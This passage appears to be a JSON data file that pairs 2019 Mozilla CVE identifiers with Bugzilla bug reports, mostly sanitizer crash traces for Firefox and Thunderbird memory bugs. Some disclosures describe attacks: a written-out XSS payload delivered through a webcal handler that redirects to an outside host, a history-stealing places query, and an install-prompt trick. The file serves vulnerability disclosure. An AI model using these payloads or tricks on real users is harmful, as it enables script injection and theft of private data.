/builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:397:9 #25 0x7fb01cdd3ac1 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3153:13 #26 0x7fb0245f5bf7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #27 0x7fb0245f5bf7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534 #28 0x7fb0245de3ef in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:593:10 #29 0x7fb0245de3ef in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3072 #30 0x7fb0245c0368 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #31 0x7fb0245fb449 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13 #32 0x7fb0246f1a37 in EvalKernel(JSContext*, JS::Handle<JS::Value>, EvalType, js::AbstractFramePtr, JS::Handle<JSObject*>, unsigned char*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:326:10 #33 0x7fb0246f3e04 in js::DirectEval(JSContext*, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:440:10 #34 0x7fb0257f51e4 in js::jit::DoCallFallback(JSContext*, js::jit::BaselineFrame*, js::jit::ICCall_Fallback*, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jit/BaselineIC.cpp:3866:10 #35 0x287384819887 (<unknown module>) #36 0x621000538877 (<unknown module>) #37 0x28738483e9d0 (<unknown module>) #38 0x62100051b25f (<unknown module>) #39 0x2873848174de (<unknown module>) #40 0x7fb025d7d6ca in EnterJit /builds/worker/workspace/build/src/js/src/jit/Jit.cpp:103:5 #41 0x7fb025d7d6ca in js::jit::MaybeEnterJit(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/jit/Jit.cpp:168 #42 0x7fb0245c025e in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:407:32 #43 0x7fb0245f6568 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:562:13 previously allocated by thread T0 (Web Content) here: #0 0x55acbf835d63 in __interceptor_malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3 #1 0x55acbf86a5fd in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:68:15 #2 0x7fb01ea627bc in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:131:10 #3 0x7fb01ea627bc in mozilla::dom::power::PowerManagerService::NewWakeLock(nsTSubstring<char16_t> const&, nsPIDOMWindowInner*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/power/PowerManagerService.cpp:118 #4 0x7fb01da34608 in mozilla::dom::HTMLMediaElement::CreateAudioWakeLockIfNeeded() /builds/worker/workspace/build/src/dom/html/HTMLMediaElement.cpp:3885:28 #5 0x7fb01da341ae in mozilla::dom::HTMLMediaElement::UpdateWakeLock() /builds/worker/workspace/build/src/dom/html/HTMLMediaElement.cpp:3872:5 #6 0x7fb01db1812c in mozilla::dom::HTMLVideoElement::UpdateWakeLock() /builds/worker/workspace/build/src/dom/html/HTMLVideoElement.cpp:350:21 #7 0x7fb01da32b94 in mozilla::dom::HTMLMediaElement::PlayInternal(bool) /builds/worker/workspace/build/src/dom/html/HTMLMediaElement.cpp:3793:3 #8 0x7fb01da31b14 in mozilla::dom::HTMLMediaElement::Play(mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/HTMLMediaElement.cpp:3721:5 #9 0x7fb01ca14bdd in play /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLMediaElementBinding.cpp:1236:45 #10 0x7fb01ca14bdd in mozilla::dom::HTMLMediaElement_Binding::play_promiseWrapper(JSContext*, JS::Handle<JSObject*>, mozilla::dom::HTMLMediaElement*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLMediaElementBinding.cpp:1250 #11 0x7fb01cdd4aad in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ConvertExceptionsToPromises>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3153:13 #12 0x7fb0245f5bf7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #13 0x7fb0245f5bf7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534 #14 0x7fb0245f81b2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:605:8 #15 0x7fb0253433bf in js::ForwardingProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:162:10 #16 0x7fb0252fc601 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:237:19 #17 0x7fb025322d00 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:504:19 #18 0x7fb0245f6c4b in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:508:14 #19 0x7fb0245de3ef in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:593:10 #20 0x7fb0245de3ef in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3072 #21 0x7fb0245c0368 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #22 0x7fb0245fb449 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13 #23 0x7fb0246f1a37 in EvalKernel(JSContext*, JS::Handle<JS::Value>, EvalType, js::AbstractFramePtr, JS::Handle<JSObject*>, unsigned char*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:326:10 #24 0x7fb0246f0ffb in js::IndirectEval(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:424:10 #25 0x7fb0245f5bf7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #26 0x7fb0245f5bf7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534 #27 0x7fb0245f81b2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:605:8 #28 0x7fb0253433bf in js::ForwardingProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:162:10 #29 0x7fb0252fc601 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /builds/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:237:19 #30 0x7fb025322d00 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:504:19 #31 0x7fb0245f6c4b in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:508:14 #32 0x7fb0245de3ef in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:593:10 #33 0x7fb0245de3ef in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3072 #34 0x7fb0245c0368 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #35 0x7fb0245fb449 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:330:9 in ~nsCOMPtr_base Shadow bytes around the buggy address: 0x0c107fffb010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c107fffb020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c107fffb030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c107fffb040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c107fffb050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c107fffb060: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd[fd] 0x0c107fffb070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c107fffb080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c107fffb090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c107fffb0a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c107fffb0b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==6682==ABORTING"
      }
    ],
    "CVE-2019-11693": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1532525",
        "title": "could be trigger oom problem with WebGLBuffer::BufferData",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36 Steps to reproduce: void WebGLBuffer::BufferData(GLenum target, size_t size, const void* data, GLenum usage) { // Careful: data.Length() could conceivably be any uint32_t, but GLsizeiptr // is like intptr_t. if (!CheckedInt<GLsizeiptr>(size).isValid()) return mContext->ErrorOutOfMemory(\"bad size\"); if (!ValidateBufferUsageEnum(mContext, usage)) return; #ifdef XP_MACOSX // bug 790879 if (mContext->gl->WorkAroundDriverBugs() && size > INT32_MAX) { mContext->ErrorOutOfMemory(\"Allocation size too large.\"); return; } #endif const void* uploadData = data; UniqueBuffer newIndexCache; if (target == LOCAL_GL_ELEMENT_ARRAY_BUFFER && mContext->mNeedsIndexValidation) { newIndexCache = malloc(size); if (!newIndexCache) { mContext->ErrorOutOfMemory(\"Failed to alloc index cache.\"); return; } memcpy(newIndexCache.get(), data, size); uploadData = newIndexCache.get(); } The bufferdata function does not have an appropriate check for size value. This coulde cause problems in the attached code. I think it's almost impossible to exploit, but I think it's a security issue. :)"
      }
    ],
    "CVE-2019-11696": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1392955",
        "title": "JNLP should be treated as executable",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 Steps to reproduce: The .JNLP (Java web start app) should be treated as executable. Visit: https://docs.oracle.com/javase/tutorial/deployment/webstart/deploying.html Press 'Launch' Actual results: The downloaded file is not treated as executable. Expected results: Given that the result of this file is that Java is executed then this should be the same as .jar files. Granted, initially these files are always opened with restricted mode, but apparently they can be signed to bypass this. I don't think it's far fetched to imagine someone malicious is capable of signing these with rogue certs. Also, (hate to do this) but Google Chrome treats it as dangerous."
      }
    ],
    "CVE-2019-11697": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1440079",
        "title": "Tricking user into accepting PopupNotification prompts through holding down accessKey",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36 Steps to reproduce: Install attached PoC extension and follow instructions. Actual results: I am mainly using the behavior where if a XPI file is visited then Firefox will automatically attempt to install and prompt user for confirmation. I noticed that you press ALT+A you can agree to installing the webextension. And so I ask a user to hold down ALT+A and I then attempt to install addon only to trick user into agreeing to install. Expected results: Block from ALT+A being activated as soon as the install prompt appears. A version of this can be done from normal web. See comment 1 and comment 2"
      }
    ],
    "CVE-2019-11698": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1543191",
        "title": "Stealing history data using places querying and drag and drop",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: Using attached PoC: If you don't have bookmarks bar open then open sidebar bookmark page by pressing CTRL+B Drag and drop the anchor tag into the bookmark bar/sidebar Now drag and drop the newly created bookmark into the webpages body Actual results: For some reason the dragged object from the bookmark bar contains 'text/html' formatted data of all the queried history entries. Which means we can steal users history data (even loaded iframes) with precision, thanks to the use of the places query. Step [2] creates a places query ( https://developer.mozilla.org/en-US/docs/Mozilla/Tech/Places/Places_query_URIs ) that looks like: place:type=0&sort=1&terms=token&maxResults=10&includeHidden=true I am looking within the users history for any entry with the term 'token' in the URL, for testing purposes I only grab 10 entries but this could be increased in an attack scenario. I also use the 'includeHidden' query operator to include otherwise hidden history entries that come from iframes and images, just to further expand my net. Step [3] is where I think the bug exists. Once we drag the newly created places query bookmark back into our webpage, we can read all the results from our query by reading the 'text/html' data entry. Expected results: There should not be a ''text/html' readable data when drag and dropping bookmarks from firefox and to firefox. I believe this may have been put there for cross application compatibility but is of no use (AFAIK) when it comes to drag and dropping within firefox."
      }
    ],
    "CVE-2019-11701": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1518627",
        "title": "Remove the default protocol handler for webcal given it has serious XSS vulnerabilities",
        "description": "Operating system: Ubuntu Linux 18.04 LTS Firefox version: Firefox Quantum 64.0 (Mozilla Firefox for Ubuntu canonical-1.0) I was looking around in about:config researching a totally different bug and found the following handler installed (by default i presume as i have not installed it): gecko.handlerService.schemes.webcal.0.name;30 Boxes gecko.handlerService.schemes.webcal.0.uriTemplate;https://30boxes.com/external/widget?refer=ff&url=%s This service is unfortunately vulnerable, and as your general eligibility states that third-party websites utilized are in-scope (\"We will pay bounties for vulnerabilities in third-party libraries incorporated into shipped client code or third-party websites utilized by Mozilla.\") i thought i would try to report this bug to get this handler removed. To reproduce: either create the following url as a link or just paste it into the web-browser: webcal://www.mozilla.org?q=<script>document.location='http://redirected.shellcode.se';</script> (I created a simple link to this on a page on my domain: http://poc.shellcode.se/webcal.html) Firefox asks if you want to open the link with the application \"30 Boxes\" (Unless the user has clicked \"Remember my choice for webcal links\"). Clicking ok will transfer the user to the url: https://30boxes.com/external/widget?refer=ff&url=www.mozilla.org?q=webcal%3A%2F%2Fwww.mozilla.org%3Fq%3D%3Cscript%3Edocument.location%3D'http%3A%2F%2Fredirected.shellcode.se'%3B%3C%2Fscript%3E This page is vulnerable to XSS and the javascript is executed. In this case only a \"harmless\" redirect. I understand that the main bug is not on your domain, but the handler seems to be installed by default and thus affects the standard product. Thanks for your time! Best regards Peter - Sweden"
      }
    ],
    "CVE-2019-11703": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1553820",
        "title": "Heap buffer overflow in icalparser.c parser_get_next_char",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 Steps to reproduce: While fuzzing icalparser_parse_string from Thunderbird's fork of libical built with ASAN, a heap buffer overflow read triggers in parser_get_next_char with some inputs. A reliable reproducer is attached. Actual results: ==2528==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60700000040f at pc 0x00000052c655 bp 0x7ffef533cc30 sp 0x7ffef533cc28 READ of size 1 at 0x60700000040f thread T0 #0 0x52c654 in parser_get_next_char /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:208:38 #1 0x5183bc in parser_get_prop_name /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:247:9 #2 0x5183bc in icalparser_add_line /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:700 #3 0x517e1b in icalparser_parse /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:623:11 #4 0x4fd243 in icalparser_parse_string /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1236:9 #5 0x4fa975 in LLVMFuzzerTestOneInput (/opt/libfuzzer/thunderbird_libical_fuzzer+0x4fa975) #6 0x43a681 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x43a681) #7 0x424327 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x424327) #8 0x42a4c1 in fuzzer::FuzzerDriver(int*, char***, int ()(unsigned char const, unsigned long)) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x42a4c1) #9 0x453f62 in main (/opt/libfuzzer/thunderbird_libical_fuzzer+0x453f62) #10 0x7f28bc086b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #11 0x41dc49 in _start (/opt/libfuzzer/thunderbird_libical_fuzzer+0x41dc49) 0x60700000040f is located 1 bytes to the left of 80-byte region [0x607000000410,0x607000000460) allocated by thread T0 here: #0 0x4cbb5d in malloc (/opt/libfuzzer/thunderbird_libical_fuzzer+0x4cbb5d) #1 0x4fe7bd in icalmemory_new_buffer /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalmemory.c:266:15 #2 0x51719b in icalparser_get_line /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:453:21 #3 0x517e0d in icalparser_parse /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:621:13 #4 0x4fd243 in icalparser_parse_string /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1236:9 #5 0x4fa975 in LLVMFuzzerTestOneInput (/opt/libfuzzer/thunderbird_libical_fuzzer+0x4fa975) #6 0x43a681 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x43a681) #7 0x424327 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x424327) #8 0x42a4c1 in fuzzer::FuzzerDriver(int*, char***, int ()(unsigned char const, unsigned long)) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x42a4c1) #9 0x453f62 in main (/opt/libfuzzer/thunderbird_libical_fuzzer+0x453f62) #10 0x7f28bc086b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 SUMMARY: AddressSanitizer: heap-buffer-overflow /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:208:38 in parser_get_next_char Expected results: No heap buffer overflow. When the vulnerable function in Thunderbird is replaced with current implementation in libical upstream (https://github.com/libical/libical/blob/master/src/libical/icalparser.c#L147) this bug doesn't manifest anymore."
      }
    ],
    "CVE-2019-11704": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1553814",
        "title": "Heap buffer overflow in icalvalue.c icalmemory_strdup_and_dequote",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 Steps to reproduce: Open the attached saved message (heap-corruption-submit.eml) in Thunderbird. Receiving this message in my inbox also triggers the bug without further user interaction. The thunderbird process is killed. Triggering the bug might require several attempts, due to differences in the heap state. See crash reports attached. Actual results: This bug manifests with several effects, including out of bounds read, write, null pointer dereference and heap corruption, depending on the heap state at the moment of the overflow. The vulnerable function icalmemory_strdup_and_dequote() lacks proper bounds checking while looping through an input buffer, which can be controlled by a remote user. When an unexpected input is provided, the loops goes out of bound causing out of bounds reads in the input buffer and out of bounds writes to a heap allocated buffer. $ gdb --args thunderbird heap-corruption-submit.eml [...] Thread 1 \"thunderbird\" received signal SIGSEGV, Segmentation fault. 0x0000555555561cae in malloc () Reports for read, write, nullptr deref and heap corruption: ==2337==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62d000009b84 at pc 0x00000053619f bp 0x7fff694798b0 sp 0x7fff694798a8 READ of size 1 at 0x62d000009b84 thread T0 #0 0x53619e in icalmemory_strdup_and_dequote /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalvalue.c:202:19 #1 0x5355c2 in icalvalue_new_from_string_with_error /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalvalue.c:546:27 #2 0x519251 in icalparser_add_line /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1075:14 #3 0x517e1b in icalparser_parse /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:623:11 #4 0x4fd243 in icalparser_parse_string /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1236:9 #5 0x4fa975 in LLVMFuzzerTestOneInput (/opt/libfuzzer/thunderbird_libical_fuzzer+0x4fa975) #6 0x43a681 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x43a681) #7 0x424327 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x424327) #8 0x42a4c1 in fuzzer::FuzzerDriver(int*, char***, int ()(unsigned char const, unsigned long)) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x42a4c1) #9 0x453f62 in main (/opt/libfuzzer/thunderbird_libical_fuzzer+0x453f62) #10 0x7f2c4823bb96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #11 0x41dc49 in _start (/opt/libfuzzer/thunderbird_libical_fuzzer+0x41dc49) 0x62d000009b84 is located 0 bytes to the right of 38788-byte region [0x62d000000400,0x62d000009b84) allocated by thread T0 here: #0 0x4cbb5d in malloc (/opt/libfuzzer/thunderbird_libical_fuzzer+0x4cbb5d) #1 0x4fe7bd in icalmemory_new_buffer /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalmemory.c:266:15 #2 0x516f03 in make_segment /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:224:11 #3 0x519195 in icalparser_get_value /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:327:11 #4 0x519195 in icalparser_add_line /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1058 #5 0x517e1b in icalparser_parse /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:623:11 #6 0x4fd243 in icalparser_parse_string /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1236:9 #7 0x4fa975 in LLVMFuzzerTestOneInput (/opt/libfuzzer/thunderbird_libical_fuzzer+0x4fa975) #8 0x43a681 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x43a681) #9 0x424327 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x424327) #10 0x42a4c1 in fuzzer::FuzzerDriver(int*, char***, int ()(unsigned char const, unsigned long)) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x42a4c1) #11 0x453f62 in main (/opt/libfuzzer/thunderbird_libical_fuzzer+0x453f62) #12 0x7f2c4823bb96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 SUMMARY: AddressSanitizer: heap-buffer-overflow /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalvalue.c:202:19 in icalmemory_strdup_and_dequote ==2357==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000000206 at pc 0x000000536197 bp 0x7ffc511418b0 sp 0x7ffc511418a8 WRITE of size 1 at 0x603000000206 thread T0 #0 0x536196 in icalmemory_strdup_and_dequote /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalvalue.c #1 0x5355c2 in icalvalue_new_from_string_with_error /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalvalue.c:546:27 #2 0x519251 in icalparser_add_line /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1075:14 #3 0x517e1b in icalparser_parse /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:623:11 #4 0x4fd243 in icalparser_parse_string /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1236:9 #5 0x4fa975 in LLVMFuzzerTestOneInput (/opt/libfuzzer/thunderbird_libical_fuzzer+0x4fa975) #6 0x43a681 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x43a681) #7 0x424327 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x424327) #8 0x42a4c1 in fuzzer::FuzzerDriver(int*, char***, int ()(unsigned char const, unsigned long)) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x42a4c1) #9 0x453f62 in main (/opt/libfuzzer/thunderbird_libical_fuzzer+0x453f62) #10 0x7fc553950b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #11 0x41dc49 in _start (/opt/libfuzzer/thunderbird_libical_fuzzer+0x41dc49) 0x603000000206 is located 0 bytes to the right of 22-byte region [0x6030000001f0,0x603000000206) allocated by thread T0 here: #0 0x4cbb5d in malloc (/opt/libfuzzer/thunderbird_libical_fuzzer+0x4cbb5d) #1 0x535eae in icalmemory_strdup_and_dequote /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalvalue.c:193:24 #2 0x5355c2 in icalvalue_new_from_string_with_error /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalvalue.c:546:27 #3 0x519251 in icalparser_add_line /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1075:14 #4 0x517e1b in icalparser_parse /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:623:11 #5 0x4fd243 in icalparser_parse_string /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalparser.c:1236:9 #6 0x4fa975 in LLVMFuzzerTestOneInput (/opt/libfuzzer/thunderbird_libical_fuzzer+0x4fa975) #7 0x43a681 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x43a681) #8 0x424327 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x424327) #9 0x42a4c1 in fuzzer::FuzzerDriver(int*, char***, int ()(unsigned char const, unsigned long)) (/opt/libfuzzer/thunderbird_libical_fuzzer+0x42a4c1) #10 0x453f62 in main (/opt/libfuzzer/thunderbird_libical_fuzzer+0x453f62) #11 0x7fc553950b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 SUMMARY: AddressSanitizer: heap-buffer-overflow /opt/src/thunderbird-60.6.1/comm/calendar/libical/src/libical/icalvalue.c in icalmemory_strdup_and_dequote ==10900==ERROR: UndefinedBehaviorSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7fa1b13fbd45 bp 0x7fff1c4e7ec0 sp 0x7fff1c4e7368 T10900) thunderbird_libical_fuzzer: malloc.c:2401: sysmalloc: Assertion `(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)' failed. ==10928== ERROR: libFuzzer: deadly signal #0 0x45c5b0 in __sanitizer_print_stack_trace (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x45c5b0) #1 0x43c61b in fuzzer::PrintStackTrace() (/opt/libfuzzer-noasan/thunderbird_libical_fuzzer+0x43c61b) #2 0x422083 in fuzzer::Fuzzer::CrashCallback() 